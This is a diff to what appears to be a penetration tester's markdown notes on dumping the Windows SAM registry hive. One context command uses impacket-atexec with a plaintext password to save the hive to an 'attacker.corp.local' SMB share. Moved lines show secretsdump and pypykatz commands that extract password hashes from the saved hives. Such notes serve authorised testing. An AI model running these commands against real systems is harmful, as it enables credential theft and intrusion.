@@ -53,18 +53,6 @@ Dump the `SAM` hive trough local registry access to a SMB share.
     impacket-atexec -silentcommand administrator:'passw0rd'@srv01.corp.local 'reg.exe save hklm\sam \\attacker.corp.local\share\%COMPUTERNAME%-sam.save'
     ~~~
 
-# Extract on Linux
-
-=== "[[notes/tools/impacket]]"
-    ~~~ bash
-    impacket-secretsdump -sam ./sam.save -security ./security.save -system ./system.save LOCAL
-    ~~~
-
-=== "[[notes/tools/pypykatz]]"
-    ~~~ bash
-    pypykatz registry --sam ./sam.save --security ./security.save --system ./system.save
-    ~~~
-
 # Dump on Windows
 
 Save registry hives directly to a SMB share.
@@ -103,3 +91,15 @@ Parse hives in memory without touching disk.
 Untested tools:
 
 - [RegSave](https://github.com/EncodeGroup/RegSave)
+
+# Extract on Linux
+
+=== "[[notes/tools/pypykatz]]"
+    ~~~ bash
+    pypykatz registry --json ./system.save --sam ./sam.save --security ./security.save
+    ~~~
+
+=== "[[notes/tools/impacket]]"
+    ~~~ bash
+    impacket-secretsdump -sam ./sam.save -security ./security.save -system ./system.save LOCAL
+    ~~~
